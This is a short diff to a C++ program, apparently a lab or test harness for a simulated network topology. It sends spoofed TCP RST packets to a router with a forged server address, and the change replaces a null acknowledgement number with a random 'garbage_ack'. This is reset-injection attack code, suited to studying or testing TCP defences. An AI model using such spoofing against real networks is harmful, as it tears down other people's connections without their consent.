@@ -39,13 +39,14 @@ int main(int argc, char **argv) {
       0, std::numeric_limits<uint32_t>::max() / 2};
   uint32_t server_isn = isn_dist(isn_engine);
   uint32_t attacker_isn = isn_dist(isn_engine);
+  uint32_t garbage_ack = isn_dist(isn_engine);
 
   // Spoof RST packets to the router from the server
   send_pkt(config, TCPPacket{
                        .src = config.topology.server_addr,
                        .dst = router_addr,
                        .seqno = server_isn,
-                       .ackno = std::nullopt,
+                       .ackno = garbage_ack,
                        .rst = true,
                    });
 
@@ -55,7 +56,7 @@ int main(int argc, char **argv) {
                        .src = config.topology.server_addr,
                        .dst = router_addr,
                        .seqno = server_isn + std::numeric_limits<uint32_t>::max() / 2,
-                       .ackno = std::nullopt,
+                       .ackno = garbage_ack,
                        .rst = true,
                    });
 
